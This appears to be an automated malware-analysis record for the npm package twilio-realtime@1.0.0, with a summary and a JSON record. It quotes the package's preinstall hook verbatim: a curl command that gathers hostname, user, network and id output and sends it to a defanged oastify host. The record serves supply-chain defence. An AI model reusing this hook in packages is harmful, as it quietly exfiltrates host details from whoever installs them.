# npm twilio-realtime@1.0.0

**Source:** datadog · **Source label:** malicious · **Released:** 2025-02-23 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The package has a single `preinstall` hook that runs an inline shell command on every registry install. It collects `hostname`, `whoami`, `ifconfig`, `pwd` and `id` output in a command substitution and sends it with `/usr/bin/curl --data-urlencode` to an oastify[.]com (Burp Collaborator) host. There are no gates: no condition in the hook or in any file decides whether this runs. Any POSIX host with curl at `/usr/bin/curl` and outbound HTTP to the endpoint triggers it.

## Execution

- **preinstall** `/usr/bin/curl --data-urlencode "info=$(hostname && whoami && ifconfig && pwd && id)" hxxp://ybdh9y14g4ucqu8et8poqe6ublhc54tt[.]oastify[.]com`: no package files; inline_shell.

## Gates

None.

## Requirements

- network: ybdh9y14g4ucqu8et8poqe6ublhc54tt[.]oastify[.]com:80 (curl sends the collected host info to this OAST endpoint over plain HTTP)
- file_present: /usr/bin/curl (hook calls curl by absolute path)
- installed_tool: hostname, whoami, ifconfig, pwd, id (recon commands in the substitution; the && chain stops at the first missing one)
- os: linux (POSIX shell substitution and /usr/bin/curl path; darwin would also work, win32 cmd would not)

## Behaviour

- Ungated: recon, exfil
- Gated: none

## Notes

- No JavaScript ships; `main` points at a missing `dist/server.js`.
- The tarball accidentally contains a whole Linux home directory (shell rc files, keyrings, npm logs, desktop config). Nothing there runs at install. Identities in those files were not recorded.
- Prefilled launch style `download_then_exec` was changed to `inline_shell`, since nothing is downloaded and executed.
- Attack type `dependency_confusion` is inferred from the unscoped brand-like name and the OAST callback; it is not stated in code.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "twilio-realtime",
    "version": "1.0.0",
    "archive_sha256": "901328efb88a91bf267790db7d23a03f190bacf000a249df20e5d41c024064f7",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2025-02-23",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2025-02-23-twilio-realtime-v1.0.0.zip",
    "package_root": "layer0/tmp/tmp8tbff1p8/twilio-realtime/package",
    "cluster_key": "a0885da1b21c8438c7dbf440e2eb5c0d3b8aad532e326cdc5cc849b58e8b40ea",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "preinstall",
        "command": "/usr/bin/curl --data-urlencode \"info=$(hostname && whoami && ifconfig && pwd && id)\" hxxp://ybdh9y14g4ucqu8et8poqe6ublhc54tt[.]oastify[.]com",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "Launch style corrected from download_then_exec to inline_shell: curl only POSTs data, nothing is fetched and run.",
      "package.json preinstall hook read in full; it is the only install code. No JS files exist (main dist/server.js is absent).",
      "The && chain inside $(...) is not a gate: a missing tool just truncates the collected text and curl still sends what was gathered.",
      "The tarball also ships a full Linux home directory (dotfiles, keyrings, npm logs, desktop config). None of it is run at install; not install-reached."
    ]
  },
  "requirements": [
    {
      "axis": "network",
      "value": "ybdh9y14g4ucqu8et8poqe6ublhc54tt[.]oastify[.]com:80",
      "reason": "curl sends the collected host info to this OAST endpoint over plain HTTP"
    },
    {
      "axis": "file_present",
      "value": "/usr/bin/curl",
      "reason": "hook calls curl by absolute path"
    },
    {
      "axis": "installed_tool",
      "value": "hostname, whoami, ifconfig, pwd, id",
      "reason": "recon commands in the substitution; the && chain stops at the first missing one"
    },
    {
      "axis": "os",
      "value": "linux",
      "reason": "POSIX shell substitution and /usr/bin/curl path; darwin would also work, win32 cmd would not"
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "recon",
      "exfil"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "hxxp://ybdh9y14g4ucqu8et8poqe6ublhc54tt[.]oastify[.]com",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "dependency_confusion",
  "family_hint": "oastify recon callback",
  "claude_assessment": "malicious",
  "assessment_reason": "The preinstall hook runs hostname, whoami, ifconfig, pwd and id and POSTs the output to an OAST (Burp Collaborator) host on every install, with no gate. The unscoped name borrowing a vendor brand fits a dependency-confusion probe.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
